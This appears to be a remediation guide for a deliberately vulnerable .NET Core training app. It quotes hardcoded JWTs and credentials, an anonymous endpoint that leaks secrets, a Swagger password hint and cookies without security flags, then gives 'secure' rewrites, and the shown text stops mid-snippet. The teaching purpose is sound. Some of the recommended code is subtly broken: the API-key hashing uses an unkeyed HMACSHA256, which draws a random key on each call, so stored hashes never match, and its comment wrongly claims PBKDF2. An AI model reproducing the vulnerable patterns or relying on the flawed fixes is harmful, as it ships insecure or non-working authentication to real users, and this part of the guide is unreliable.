# 🔒 Critical Security Vulnerability Analysis & Remediation Guide

**Project:** MyApp (.NET Core 3.1 API + Vue 3 Frontend)  
**Assessment Date:** 2026  
**Severity Level:** CRITICAL (8/8 issues)

---

## Executive Summary

This application contains **8 critical security vulnerabilities** that expose sensitive data, allow unauthorized access, enable code injection, and compromise data integrity. These issues must be remediated immediately before production deployment.

**Risk Impact:** Full system compromise, data breach, unauthorized access, credential exposure

---

# 🚨 CRITICAL ISSUE #1: Hardcoded JWT Tokens Exposed (I1)

**Location:** [InsecureController.cs](InsecureController.cs#L25-L32)  
**Severity:** CRITICAL (CVSS 9.1)

## What's the Security Risk?

The `/my-values` endpoint returns hardcoded JWT tokens and credentials that can be decoded to extract sensitive information including:
- User identity claims
- Passwords embedded in token payload
- Test credentials for all environments
- Multiple authentication bypass methods

```csharp
// VULNERABLE - Line 25-32
return new string[] {
    "1234Qwert%",  // Potential password
    "non-pi information",
    "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5...",  // Base64 JWT
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkxldmVsVXBHaXRIdWJDb3BpbG90IiwicGFzc3dvcmQiOiJsZXZlbFVwMjYi..." // Decoded shows password
};
```

**Decoded Token Payload:**
```json
{
  "sub": "1234567890",
  "name": "LevelUpGitHubCopilot",
  "password": "levelUp26",
  "iat": 1516239022
}
```

## Why is this dangerous?

1. **Authentication Bypass** - Attackers copy the JWT token and use it to impersonate legitimate users
2. **Credential Harvesting** - Passwords and secrets are exposed in plaintext within token payloads
3. **No Authentication Required** - `[AllowAnonymous]` attribute allows anyone to access these credentials
4. **Git History Exposure** - These tokens are permanently stored in version control
5. **Public Swagger UI** - Swagger documentation in development exposes all test endpoints
6. **Token Reuse** - Static tokens can be used indefinitely without rotation

## The Fix

**BEFORE (Vulnerable):**
```csharp
[HttpGet]
[Route("/my-values")]
[AllowAnonymous]  // ❌ Anyone can access
[ProducesResponseType(typeof(IEnumerable<string>), 200)]
public ActionResult<IEnumerable<string>> Get()
{
    return new string[] {
        "1234Qwert%",
        "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5...",  // ❌ Hardcoded tokens
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkxldmVsVXBHaXRIdWJDb3BpbG90IiwicGFzc3dvcmQiOiJsZXZlbFVwMjYi..."
    };
}
```

**AFTER (Secure):**
```csharp
[HttpGet]
[Route("/api/user-profile")]
[Authorize]  // ✅ Requires authentication
[ProducesResponseType(typeof(UserProfileDto), 200)]
[ProducesResponseType(StatusCodes.Status401Unauthorized)]
public ActionResult<UserProfileDto> GetUserProfile()
{
    // Extract authenticated user from claims
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    
    if (string.IsNullOrEmpty(userId))
    {
        return Unauthorized("User not found in claims");
    }
    
    // Retrieve user data from secure storage (database, not hardcoded)
    var userProfile = _userService.GetUserProfile(userId);
    
    if (userProfile == null)
    {
        return NotFound();
    }
    
    // Return only necessary, non-sensitive data
    return Ok(new UserProfileDto 
    { 
        Id = userProfile.Id,
        Username = userProfile.Username,
        Email = userProfile.Email
        // ⚠️ NEVER include: passwords, tokens, API keys, credit cards
    });
}
```

## Best Practice

### 1. **Use JWT Properly**
```csharp
// Generate JWT dynamically (never hardcode)
public string GenerateJWT(User user)
{
    var tokenHandler = new JwtSecurityTokenHandler();
    var key = Encoding.ASCII.GetBytes(_configuration["Jwt:Secret"]);
    
    var tokenDescriptor = new SecurityTokenDescriptor
    {
        Subject = new ClaimsIdentity(new Claim[]
        {
            new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
            new Claim(ClaimTypes.Name, user.Username),
            // ✅ Include claims, NOT sensitive data
        }),
        Expires = DateTime.UtcNow.AddHours(1),  // Short expiration
        SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
    };
    
    var token = tokenHandler.CreateToken(tokenDescriptor);
    return tokenHandler.WriteToken(token);
}
```

### 2. **Separating Sensitive Data**
- **In JWT:** Only non-sensitive claims (user ID, roles)
- **In Headers:** Authentication credentials
- **In Database:** All sensitive data (passwords hashed, API keys encrypted)
- **In API Response:** Only public/authorized data specific to the user

### 3. **Environment-Specific Secrets**
```json
// appsettings.Development.json (NEVER commit secrets)
{
  "Jwt": {
    "Secret": "use-user-secrets-in-development",
    "ValidAudience": "http://localhost:3000",
    "ValidIssuer": "http://localhost:5001"
  }
}
```

Use Azure Key Vault or AWS Secrets Manager for production.

## Learning Point

**Rule: Never embed credentials, tokens, or sensitive data in source code.**

- ❌ Hardcoded passwords, API keys, tokens
- ❌ Secrets in JWT payloads
- ❌ Test data containing real passwords
- ✅ Use environment variables or secret management services
- ✅ Generate tokens dynamically
- ✅ Store sensitive data encrypted in secure storage
- ✅ Apply principle of least privilege - only return what's needed

---

# 🚨 CRITICAL ISSUE #2: Hardcoded Authentication Credential (S1)

**Location:** [BasicAuthenticationHandler.cs](BasicAuthenticationHandler.cs#L9)  
**Severity:** CRITICAL (CVSS 9.8)

## What's the Security Risk?

A single hardcoded credential is used to authenticate all API requests:

```csharp
private const string ExpectedAuthValue = "level-up-with-github-copilot-26";
```

This credential is:
- **Visible in source code** - Anyone with repo access can see it
- **Permanent in git history** - Even if removed, it remains in commit history
- **Unchangeable** - No rotation mechanism, requires code deployment to change
- **Single point of failure** - One stolen credential compromises entire system

## Why is this dangerous?

1. **Credential Compromise** - If leaked (through git, screenshot, email), anyone with it gains API access
2. **No Audit Trail** - Can't identify who used the credential (all requests look identical)
3. **Insider Threat** - Any developer with repo access has production credentials
4. **No Revocation** - Can't revoke a compromised credential without redeploying
5. **Compliance Violation** - Fails PCI-DSS, SOC 2, HIPAA (if handling regulated data)
6. **Credential Stuffing** - If credential leaks, attackers will try it on other systems

## The Fix

**BEFORE (Vulnerable):**
```csharp
public class BasicAuthenticationHandler : AuthenticationHandler<AuthenticationSchemeOptions>
{
    private const string ExpectedAuthValue = "level-up-with-github-copilot-26";  // ❌ Hardcoded
    
    protected override Task<AuthenticateResult> HandleAuthenticateAsync()
    {
        var authHeaderValue = authorizationHeader.ToString();
        
        if (authHeaderValue != ExpectedAuthValue)  // ❌ Simple string comparison
        {
            return Task.FromResult(AuthenticateResult.Fail("Invalid"));
        }
        // ...
    }
}
```

**AFTER (Secure - Using configuration + hashing):**
```csharp
public class ApiKeyAuthenticationHandler : AuthenticationHandler<AuthenticationSchemeOptions>
{
    private readonly IConfiguration _configuration;
    private readonly IApiKeyService _apiKeyService;
    
    public ApiKeyAuthenticationHandler(
        IOptionsMonitor<AuthenticationSchemeOptions> options,
        ILoggerFactory logger,
        UrlEncoder encoder,
        ISystemClock clock,
        IConfiguration configuration,
        IApiKeyService apiKeyService) 
        : base(options, logger, encoder, clock)
    {
        _configuration = configuration;
        _apiKeyService = apiKeyService;
    }
    
    protected override async Task<AuthenticateResult> HandleAuthenticateAsync()
    {
        if (!Request.Headers.TryGetValue("X-API-Key", out var apiKeyHeader))
        {
            return AuthenticateResult.Fail("Missing API Key");
        }
        
        string apiKey = apiKeyHeader.ToString();
        
        // ✅ Validate against securely stored API keys (database)
        var validApiKey = await _apiKeyService.ValidateApiKeyAsync(apiKey);
        
        if (validApiKey == null)
        {
            return AuthenticateResult.Fail("Invalid API Key");
        }
        
        // ✅ Create audit log
        _logger.LogInformation($"API access by client: {validApiKey.ClientId} at {DateTime.UtcNow}");
        
        var claims = new[] 
        {
            new Claim(ClaimTypes.NameIdentifier, validApiKey.ClientId),
            new Claim(ClaimTypes.Name, validApiKey.ClientName),
            new Claim("api-key-id", validApiKey.Id.ToString()),
        };
        
        var identity = new ClaimsIdentity(claims, Scheme.Name);
        var principal = new ClaimsPrincipal(identity);
        var ticket = new AuthenticationTicket(principal, Scheme.Name);
        
        return AuthenticateResult.Success(ticket);
    }
}
```

**API Key Service (Secure Storage):**
```csharp
public interface IApiKeyService
{
    Task<ValidApiKey> ValidateApiKeyAsync(string providedKey);
    Task<ApiKey> CreateApiKeyAsync(string clientId, string clientName);
    Task RevokeApiKeyAsync(string apiKeyId);
    Task<IEnumerable<ApiKey>> GetClientApiKeysAsync(string clientId);
}

public class ApiKeyService : IApiKeyService
{
    private readonly ApplicationDbContext _dbContext;
    
    public async Task<ValidApiKey> ValidateApiKeyAsync(string providedKey)
    {
        // ✅ Hash the provided key to compare with stored hash
        string hashedProvidedKey = HashApiKey(providedKey);
        
        var apiKey = await _dbContext.ApiKeys
            .FirstOrDefaultAsync(k => 
                k.HashedKey == hashedProvidedKey && 
                k.IsActive && 
                k.ExpiresAt > DateTime.UtcNow);
        
        if (apiKey == null)
            return null;
        
        return new ValidApiKey 
        { 
            Id = apiKey.Id,
            ClientId = apiKey.ClientId,
            ClientName = apiKey.ClientName,
            LastUsed = DateTime.UtcNow
        };
    }
    
    private string HashApiKey(string apiKey)
    {
        // ✅ Use PBKDF2 or similar for hashing
        using (var hmac = new System.Security.Cryptography.HMACSHA256())
        {
            byte[] hashBytes = hmac.ComputeHash(Encoding.UTF8.GetBytes(apiKey));
            return Convert.ToBase64String(hashBytes);
        }
    }
}
```

## Best Practice

### 1. **API Key Rotation Strategy**
```csharp
// Programmatic key rotation
public async Task RotateApiKeyAsync(string clientId)
{
    var oldKey = await _dbContext.ApiKeys
        .FirstOrDefaultAsync(k => k.ClientId == clientId && k.IsActive);
    
    if (oldKey != null)
    {
        oldKey.IsActive = false;  // Disable old key
        oldKey.DeactivatedAt = DateTime.UtcNow;
    }
    
    var newKey = new ApiKey
    {
        ClientId = clientId,
        HashedKey = HashApiKey(GenerateSecureKey()),
        IsActive = true,
        CreatedAt = DateTime.UtcNow,
        ExpiresAt = DateTime.UtcNow.AddYears(1)
    };
    
    _dbContext.ApiKeys.Add(newKey);
    await _dbContext.SaveChangesAsync();
}

private string GenerateSecureKey()
{
    // ✅ Generate cryptographically secure random key
    using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
    {
        byte[] keyBytes = new byte[32];  // 256 bits
        rng.GetBytes(keyBytes);
        return Convert.ToBase64String(keyBytes);
    }
}
```

### 2. **Configuration-Driven Secrets**
```csharp
// Startup.cs
services.Configure<ApiKeySettings>(
    configuration.GetSection("ApiKeySettings"));

// appsettings.json (template - never commit actual values)
{
  "ApiKeySettings": {
    "HashingAlgorithm": "PBKDF2",
    "RotationIntervalDays": 90,
    "MaxApiKeysPerClient": 5
  }
}

// Use Azure Key Vault in production
var keyVaultUrl = $"https://{vaultName}.vault.azure.net/";
var credential = new DefaultAzureCredential();
builder.AddAzureKeyVault(new Uri(keyVaultUrl), credential);
```

### 3. **Audit Logging**
```csharp
public class ApiAuditLog
{
    public int Id { get; set; }
    public string ApiKeyId { get; set; }
    public string ClientId { get; set; }
    public string Endpoint { get; set; }
    public string HttpMethod { get; set; }
    public int ResponseStatusCode { get; set; }
    public DateTime RequestedAt { get; set; }
    public string IpAddress { get; set; }
}

// Log after successful authentication
_auditLogger.LogApiAccess(new ApiAuditLog
{
    ApiKeyId = validApiKey.Id.ToString(),
    ClientId = validApiKey.ClientId,
    Endpoint = Request.Path,
    HttpMethod = Request.Method,
    RequestedAt = DateTime.UtcNow,
    IpAddress = Request.HttpContext.Connection.RemoteIpAddress.ToString()
});
```

## Learning Point

**Rule: Never store unencrypted credentials in code. Store hashed credentials, manage them programmatically.**

- ❌ Hardcoded plaintext credentials
- ❌ Credentials in comments or documentation
- ❌ Single unchangeable credential
- ✅ Hash and store credentials in secure database
- ✅ Implement rotation and expiration
- ✅ Create audit trails for access
- ✅ Use cryptographically secure key generation

---

# 🚨 CRITICAL ISSUE #3: Swagger Exposes Password Hint (I2)

**Location:** [Startup.cs](Startup.cs#L29-L31)  
**Severity:** CRITICAL (CVSS 8.2)

## What's the Security Risk?

The Swagger UI documentation reveals information about the authentication credential:

```csharp
c.AddSecurityDefinition("ApiKey", new OpenApiSecurityScheme
{
    Description = "Basic Authentication. You could never guess the value, ends with 26 😜",  // ❌ Password hint
    // ...
});
```

This hints that:
- The password/credential ends with "26"
- The credential is short/guessable
- The creator is confident it's secure (overconfidence bias - security anti-pattern)

## Why is this dangerous?

1. **Information Disclosure** - Gives attackers clues about password format
2. **Reduced Password Space** - "Ends with 26" eliminates billions of possibilities
3. **Swagger Public in Dev** - Development environments often have public Swagger UI
4. **Encourages Brute Force** - With hint, attackers know exactly what to target
5. **Social Engineering** - Information can be used to sound authentic when phishing
6. **Compliance Issue** - Violates OWASP principle of least information disclosure

## The Fix

**BEFORE (Vulnerable):**
```csharp
c.AddSecurityDefinition("ApiKey", new OpenApiSecurityScheme
{
    Description = "Basic Authentication. You could never guess the value, ends with 26 😜",  // ❌ Reveals hint
    Type = SecuritySchemeType.ApiKey,
    Name = "Authorization",
    In = ParameterLocation.Header,
    Scheme = "ApiKeyScheme"
});
```

**AFTER (Secure):**
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddAuthentication("ApiKeyAuthentication")
        .AddScheme<AuthenticationSchemeOptions, ApiKeyAuthenticationHandler>("ApiKeyAuthentication", null);
    
    services.AddControllers();
    
    services.AddSwaggerGen(c =>
    {
        c.SwaggerDoc("v1", new OpenApiInfo 
        { 
            Title = "MyApp API",
            Version = "v1",
            Description = "Secure API for MyApp"
            // ❌ REMOVED: Details about authentication weakness
        });
        
        // ✅ Generic, non-informative description
        c.AddSecurityDefinition("ApiKey", new OpenApiSecurityScheme
        {
            Description = "API Key authentication required. Include your API key in the X-API-Key header.",
            Type = SecuritySchemeType.ApiKey,
            Name = "X-API-Key",  // ✅ Use standard header name
            In = ParameterLocation.Header,
            Scheme = "ApiKey"
        });
        
        var scheme = new OpenApiSecurityScheme
        {
            Reference = new OpenApiReference
            {
                Type = ReferenceType.SecurityScheme,
                Id = "ApiKey"
            },
            In = ParameterLocation.Header
        };
        
        var requirement = new OpenApiSecurityRequirement
        {
            { scheme, new List<string>() }
        };
        
        c.AddSecurityRequirement(requirement);
        
        // ✅ Prevent Swagger in production
        if (!Environment.IsDevelopment())
        {
            // Don't add Swagger files in production
            return;
        }
        
        var xmlFile = $"{Assembly.GetExecutingAssembly().GetName().Name}.xml";
        var xmlPath = Path.Combine(AppContext.BaseDirectory, xmlFile);
        c.IncludeXmlComments(xmlPath);
    });
}
```

**Restrict Swagger to Development:**
```csharp
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    if (env.IsDevelopment())
    {
        // ✅ Only enable documentation tools in development
        app.UseDeveloperExceptionPage();
        app.UseSwagger();
        app.UseSwaggerUI(c =>
        {
            c.SwaggerEndpoint("/swagger/v1/swagger.json", "MyApp API V1");
            c.DocExpansion(DocExpansion.None);  // Collapse by default
        });
    }
    else
    {
        // ✅ Secure error handling in production
        app.UseExceptionHandler("/error");
        app.UseHsts();
    }
    
    app.UseHttpsRedirection();
    app.UseRouting();
    app.UseAuthentication();
    app.UseAuthorization();
    
    app.UseEndpoints(endpoints =>
    {
        endpoints.MapControllers();
    });
}
```

## Best Practice

### 1. **Environment-Based Documentation**
```csharp
public class Startup
{
    private readonly IConfiguration _configuration;
    private readonly IWebHostEnvironment _env;
    
    public Startup(IConfiguration configuration, IWebHostEnvironment env)
    {
        _configuration = configuration;
        _env = env;
    }
    
    public void ConfigureServices(IServiceCollection services)
    {
        // Only add Swagger services in development/staging
        if (_env.IsDevelopment() || _env.IsEnvironment("Staging"))
        {
            services.AddSwaggerGen(c => 
            {
                // Generic, non-revealing descriptions only
                c.SwaggerDoc("v1", new OpenApiInfo 
                { 
                    Title = "MyApp API",
                    Version = "v1",
                    Description = "API documentation for authorized users",
                    Contact = new OpenApiContact 
                    { 
                        Name = "API Support",
                        Email = "api-support@company.com"
                    }
                });
            });
        }
    }
}
```

### 2. **API Documentation Guidelines**
```
DO:
✅ "Include API key in X-API-Key header"
✅ "Authentication required for all endpoints"
✅ "Contact support for API key registration"

DON'T:
❌ "Password is 'level-up-with-github-copilot-26'"
❌ "Default credentials are admin/admin123"
❌ "No authentication required for /test endpoint"
❌ "Test data available at /fixtures"
```

### 3. **Separate Public and Internal Documentation**
```csharp
// Internal (development-only) Swagger
services.AddSwaggerGen(c =>
{
    c.SwaggerDoc("v1-internal", new OpenApiInfo 
    { 
        Title = "MyApp API (Internal)",
        Version = "v1",
        Description = "Development documentation - DO NOT EXPOSE PUBLICLY"
    });
    c.IncludeXmlComments(xmlPath);  // Include detailed comments only here
});

// External (minimal) documentation
// Serve separately on different port or protected endpoint
```

## Learning Point

**Rule: Never disclose security configuration details in public documentation.**

- ❌ Hints about passwords or credentials
- ❌ Details about authentication mechanisms
- ❌ Test endpoints or backdoors listed
- ❌ Swagger/documentation accessible in production
- ✅ Generic authentication descriptions only
- ✅ Disable documentation tools in production
- ✅ Use separate internal/external documentation
- ✅ Require authentication to access API documentation

---

# 🚨 CRITICAL ISSUE #4: AllowAnonymous on Sensitive Endpoint (E1)

**Location:** [InsecureController.cs](InsecureController.cs#L20-L27)  
**Severity:** CRITICAL (CVSS 9.1)

## What's the Security Risk?

The `/my-values` endpoint is marked with `[AllowAnonymous]` and returns sensitive data:

```csharp
[HttpGet]
[Route("/my-values")]
[AllowAnonymous]  // ❌ No authentication required
[ProducesResponseType(typeof(IEnumerable<string>), 200)]
public ActionResult<IEnumerable<string>> Get()
{
    return new string[] {
        "1234Qwert%",         // ❌ Test password
        "non-pi information",
        "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5...",  // ❌ Base64 JWT
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."  // ❌ Another JWT with password in payload
    };
}
```

## Why is this dangerous?

1. **Unauthenticated Access** - No login required to retrieve sensitive data
2. **Complete Information Disclosure** - All test credentials exposed in single request
3. **No Access Control** - Cannot audit who accessed the data
4. **Automation-Friendly** - Attackers can script credential harvesting
5. **Zero Knowledge Required** - No security clearance or credentials needed
6. **Mass Exploitation** - Any external attacker can harvest all secrets

## The Fix

**BEFORE (Vulnerable):**
```csharp
[HttpGet]
[Route("/my-values")]
[AllowAnonymous]  // ❌ NEVER use for sensitive data
public ActionResult<IEnumerable<string>> Get()
{
    return new string[] {
        "1234Qwert%",  // ❌ Never expose
        "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5..."
    };
}
```

**AFTER (Secure):**
```csharp
[HttpGet]
[Route("api/values")]
[Authorize]  // ✅ Requires authentication
[Authorize(Roles = "Admin")]  // ✅ Requires specific role
[ProducesResponseType(typeof(IEnumerable<ValueDto>), 200)]
[ProducesResponseType(StatusCodes.Status401Unauthorized)]
[ProducesResponseType(StatusCodes.Status403Forbidden)]
public async Task<ActionResult<IEnumerable<ValueDto>>> GetValuesAsync()
{
    // ✅ Extract authenticated user
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    var userRole = User.FindFirst(ClaimTypes.Role)?.Value;
    
    if (string.IsNullOrEmpty(userId))
    {
        _logger.LogWarning("GetValues requested without authentication");
        return Unauthorized();
    }
    
    if (userRole != "Admin")
    {
        _logger.LogWarning($"GetValues requested by non-admin user {userId}");
        return Forbid();
    }
    
    // ✅ Retrieve data from authorized source (database, not hardcoded)
    var values = await _valueService.GetAllValuesAsync();
    
    // ✅ Map to DTO - exclude sensitive fields
    var result = values.Select(v => new ValueDto
    {
        Id = v.Id,
        Name = v.Name,
        CreatedDate = v.CreatedDate
        // ❌ NEVER include: passwords, tokens, SSNs, credit cards
    }).ToList();
    
    // ✅ Log access
    _auditLogger.Log(new AuditEntry
    {
        UserId = userId,
        Action = "GetAllValues",
        Resource = "/api/values",
        Timestamp = DateTime.UtcNow,
        Success = true
    });
    
    return Ok(result);
}
```

**DTO (Data Transfer Object) for Safe Response:**
```csharp
public class ValueDto
{
    public int Id { get; set; }
    public string Name { get; set; }
    public DateTime CreatedDate { get; set; }
    // ❌ All sensitive fields excluded
}

// Never expose raw domain objects that might contain secrets
public class Value  // Domain model
{
    public int Id { get; set; }
    public string Name { get; set; }
    public string ApiKey { get; set; }  // ❌ Never expose
    public string InternalPassword { get; set; }  // ❌ Never expose
    public DateTime CreatedDate { get; set; }
}
```

## Best Practice

### 1. **Authorization Policies**
```csharp
// Startup.cs
services.AddAuthorization(options =>
{
    // Policy: User can only access their own data
    options.AddPolicy("OwnResourceOnly", policy =>
        policy.Requirements.Add(new SameUserRequirement()));
    
    // Policy: Admin only
    options.AddPolicy("AdminOnly", policy =>
        policy.RequireRole("Admin"));
    
    // Policy: Sensitive operations require MFA
    options.AddPolicy("RequireMFA", policy =>
        policy.Requirements.Add(new MfaRequirement()));
});

// Usage in controller
[Authorize(Policy = "OwnResourceOnly")]
[HttpGet("{id}")]
public async Task<ActionResult<UserDto>> GetUserAsync(int id)
{
    var userId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier).Value);
    
    if (id != userId)
        return Forbid();  // ✅ Resource check
    
    return await _userService.GetUserAsync(id);
}
```

### 2. **Endpoint Security Matrix**
```csharp
[ApiController]
[Route("api/[controller]")]
public class AdminController : ControllerBase
{
    // ✅ Public endpoints (minimal data)
    [HttpGet("status")]
    [AllowAnonymous]
    public ActionResult<string> GetStatus() => Ok("Service healthy");
    
    // ✅ Authenticated endpoints (more data)
    [HttpGet("profile")]
    [Authorize]
    public ActionResult<UserProfileDto> GetProfile() => Ok(_profile);
    
    // ✅ Admin-only endpoints (sensitive data)
    [HttpGet("audit-logs")]
    [Authorize(Roles = "Admin")]
    public ActionResult<IEnumerable<AuditLogDto>> GetAuditLogs() => Ok(_logs);
    
    // ✅ Super-admin endpoints (most sensitive)
    [HttpGet("credentials")]
    [Authorize(Policy = "SuperAdminOnly")]
    public ActionResult<IEnumerable<CredentialDto>> GetCredentials() => Ok(_creds);
}
```

### 3. **Data Classification in Responses**
```csharp
public class SecureResponseBuilder
{
    public static ValueDto BuildValueDto(Value value, ClaimsPrincipal user)
    {
        var userRole = user.FindFirst(ClaimTypes.Role)?.Value;
        
        var dto = new ValueDto { Id = value.Id, Name = value.Name };
        
        // ✅ Include sensitive fields only for authorized users
        if (userRole == "Admin")
        {
            dto.InternalNotes = value.InternalNotes;  // ✅ Admin can see
        }
        
        return dto;
    }
}
```

## Learning Point

**Rule: `[AllowAnonymous]` should never be used on endpoints returning sensitive data.**

- ❌ Sensitive endpoints without `[Authorize]`
- ❌ `[AllowAnonymous]` returning user data, credentials, or PII
- ❌ Unauthenticated access to configuration or internal data
- ✅ Use `[Authorize]` by default on all endpoints
- ✅ Only explicitly allow anonymous for truly public endpoints
- ✅ Return different data based on user role/permissions
- ✅ Use DTOs to prevent accidental data exposure

---

# 🚨 CRITICAL ISSUE #5: Insecure Cookies (T2)

**Location:** [InsecureController.cs](InsecureController.cs#L48-L73)  
**Severity:** CRITICAL (CVSS 8.8)

## What's the Security Risk?

The `/cookies` endpoint sets an insecure cookie without security flags:

```csharp
// Set insecure cookie
Response.Cookies.Append(
    "InsecureCookie",
    "InsecureValue123",
    new CookieOptions
    {
        // ❌ No HttpOnly, Secure, or SameSite flags
        Expires = DateTime.UtcNow.AddDays(7)
    });
```

When secure cookie is set:
```csharp
Response.Cookies.Append(
    "SecureCookie",
    "Q3rty12d0tnet",
    new CookieOptions
    {
        HttpOnly = true,    // ✅ Correct
        Secure = true,      // ✅ Correct
        SameSite = SameSiteMode.Strict,  // ✅ Correct
        Expires = DateTime.UtcNow.AddDays(7)
    });
```

## Why is this dangerous?

1. **JavaScript Access (XSS)** - Missing `HttpOnly` flag allows `document.cookie` to access it
2. **HTTPS Not Required** - Missing `Secure` flag allows transmission over HTTP
3. **Cross-Site Request Forgery** - Missing `SameSite` flag allows cookie in cross-origin requests
4. **Session Hijacking** - Unencrypted HTTP transmission + JS access = cookie theft
5. **MIT Attacks** - Man-in-the-Middle can intercept plaintext cookie
6. **Replay Attacks** - Stolen cookies can be replayed in requests

## The Fix

**BEFORE (Vulnerable):**
```csharp
[HttpPost]
[Route("/cookies")]
[Authorize]
public ActionResult<IEnumerable<string>> Post()
{
    // ✅ Secure cookie (correct example)
    Response.Cookies.Append(
        "SecureCookie",
        "Q3rty12d0tnet",
        new CookieOptions
        {
            HttpOnly = true,
            Secure = true,
            SameSite = SameSiteMode.Strict,
            Expires = DateTime.UtcNow.AddDays(7)
        });

    // ❌ Insecure cookie (vulnerable)
    Response.Cookies.Append(
        "InsecureCookie",
        "InsecureValue123",
        new CookieOptions
        {
            // No security options set - VULNERABLE!
            Expires = DateTime.UtcNow.AddDays(7)
        });

    return Ok();
}
```

**AFTER (Secure):**
```csharp
[HttpPost]
[Route("api/session")]
[Authorize]
[ProducesResponseType(StatusCodes.Status200OK)]
public ActionResult CreateSession()
{
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    
    // ✅ Generate cryptographically secure session token
    var sessionToken = GenerateSecureSessionToken();
    
    // ✅ Store session in server-side cache/database
    _sessionStore.CreateSession(userId, sessionToken, TimeSpan.FromDays(7));
    
    // ✅ Set secure cookie with all protection flags
    Response.Cookies.Append(
        "SessionId",
        sessionToken,
        new CookieOptions
        {
            HttpOnly = true,              // ✅ Prevents JavaScript access
            Secure = true,                // ✅ HTTPS only
            SameSite = SameSiteMode.Strict,  // ✅ Same-site requests only
            Expires = DateTime.UtcNow.AddDays(7),
            Path = "/",                   // ✅ Available to entire site
            Domain = GetSecureDomain(),   // ✅ Specify domain explicitly
            IsEssential = true            // ✅ Not affected by consent policies
        });
    
    _auditLogger.Log($"Session created for user {userId}");
    
    return Ok();
}

private string GenerateSecureSessionToken()
{
    // ✅ 32 bytes = 256 bits of entropy
    using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
    {
        byte[] tokenBytes = new byte[32];
        rng.GetBytes(tokenBytes);
        return Convert.ToBase64String(tokenBytes);
    }
}

private string GetSecureDomain()
{
    // ✅ Only set domain for exact matches to prevent subdomain access
    return "api.company.com";
}
```

**Secure Cookie Configuration in Startup:**
```csharp
public void ConfigureServices(IServiceCollection services)
{
    // ✅ Configure session options globally
    services.ConfigureApplicationCookie(options =>
    {
        options.Cookie.HttpOnly = true;
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // HTTPS only
        options.Cookie.SameSite = SameSiteMode.Strict;
        options.ExpireTimeSpan = TimeSpan.FromDays(7);
        options.SlidingExpiration = true;  // Extend expiration with activity
        
        options.LoginPath = "/login";
        options.LogoutPath = "/logout";
        options.AccessDeniedPath = "/access-denied";
    });
    
    // ✅ Only accept secure cookies from clients
    services.AddHsts(options =>
    {
        options.MaxAge = TimeSpan.FromDays(365);
        options.IncludeSubDomains = true;
    });
}

public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    // ✅ Force HTTPS
    app.UseHttpsRedirection();
    
    // ✅ Set security headers
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
        context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
        context.Response.Headers.Add("X-Frame-Options", "DENY");
        context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
        context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");
        
        await next();
    });
    
    app.UseHsts();
}
```

## Best Practice

### 1. **Cookie Security Checklist**
```
For ALL cookies containing authentication/session information:

☑ HttpOnly = true          // Prevents JavaScript access
☑ Secure = true            // HTTPS transmission only
☑ SameSite = Strict/Lax    // CSRF protection
☑ Path = "/"               // Appropriate path scope
☑ Domain = null            // Current domain only
☑ Expires/MaxAge           // Reasonable expiration

For development-only cookies:
☑ Secure = false (if testing locally)
☑ Document why it's insecure
☑ Remove before production
```

### 2. **Cookie Lifecycle Management**
```csharp
public class SessionManager
{
    public void CreateSessionCookie(string userId)
    {
        var sessionId = Guid.NewGuid().ToString();
        
        // ✅ Store session server-side (database)
        _sessionRepository.Create(new Session
        {
            Id = sessionId,
            UserId = userId,
            CreatedAt = DateTime.UtcNow,
            ExpiresAt = DateTime.UtcNow.AddDays(7),
            IsActive = true
        });
        
        // ✅ Set secure cookie pointing to server-side session
        _httpContextAccessor.HttpContext.Response.Cookies.Append(
            "SessionId",
            sessionId,
            BuildSecureCookieOptions());
    }
    
    public bool ValidateSessionCookie(string sessionId)
    {
        // ✅ Always validate against server-side session
        var session = _sessionRepository.GetById(sessionId);
        
        if (session == null || !session.IsActive || session.ExpiresAt < DateTime.UtcNow)
        {
            return false;
        }
        
        // ✅ Update last access time
        session.LastAccessedAt = DateTime.UtcNow;
        _sessionRepository.Update(session);
        
        return true;
    }
    
    public void RevokeSessionCookie()
    {
        // ✅ Remove server-side session
        var sessionId = _httpContextAccessor.HttpContext.Request.Cookies["SessionId"];
        _sessionRepository.Delete(sessionId);
        
        // ✅ Clear cookie from client
        _httpContextAccessor.HttpContext.Response.Cookies.Delete("SessionId", 
            BuildSecureCookieOptions());
    }
    
    private CookieOptions BuildSecureCookieOptions()
    {
        return new CookieOptions
        {
            HttpOnly = true,
            Secure = true,
            SameSite = SameSiteMode.Strict,
            Expires = DateTime.UtcNow.AddDays(7)
        };
    }
}
```

### 3. **Third-Party Cookie Handling**
```csharp
// ✅ Configure for third-party integrations carefully
services.Configure<CookiePolicyOptions>(options =>
{
    options.CheckConsentNeeded = context => true;
    options.MinimumSameSitePolicy = SameSiteMode.Strict;
    
    // Deny third-party cookies by default
    options.OnAppendCookie = cookieContext =>
    {
        if (!IsTrustedThirdParty(cookieContext.Cookie.Name))
        {
